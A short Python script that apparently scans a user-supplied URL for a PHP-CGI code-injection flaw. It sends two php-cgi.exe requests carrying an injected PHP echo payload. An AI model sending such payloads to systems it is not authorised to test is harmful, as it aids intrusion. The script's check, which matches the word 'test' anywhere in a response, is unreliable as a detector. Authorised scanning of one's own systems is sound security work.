import requests

def test_cgi_vulnerability(url):
    payloads = [
        '/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20"test";?>',
        '/php-cgi/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20"test";?>'
    ]
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if "test" in response.text:
                print(f"Potential vulnerability detected at: {test_url}")
            else:
                print(f"No vulnerability detected at: {test_url}")
        except Exception as e:
            print(f"Error testing {test_url}: {e}")

if __name__ == "__main__":
    url = input("Enter the URL to test (e.g., http://example.com): ")
    test_cgi_vulnerability(url)
